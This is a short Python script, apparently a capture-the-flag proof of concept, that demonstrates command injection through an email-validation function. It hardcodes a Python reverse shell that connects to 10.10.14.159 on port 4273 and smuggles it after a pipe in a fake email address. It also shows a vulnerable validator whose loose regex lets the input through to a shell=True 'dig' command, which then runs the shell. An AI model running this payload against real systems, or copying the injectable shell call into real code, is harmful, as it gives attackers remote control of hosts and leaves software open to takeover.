import re
from subprocess import run, PIPE

REVERSE_SHELL = """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.159",4273));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""
PAYLOAD = f"example@gmail.com | {REVERSE_SHELL}"


def issecure(email):
    if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
        print(f"bad regex {email}")
    else:
        domain = email.split("@", 1)[1]
        COMMAND = f"dig txt {domain}"
        print(f"command\n{COMMAND}")
        result = run([COMMAND], shell=True, stdout=PIPE)


if __name__ == '__main__':
    print(PAYLOAD)
    print()
    issecure(PAYLOAD)
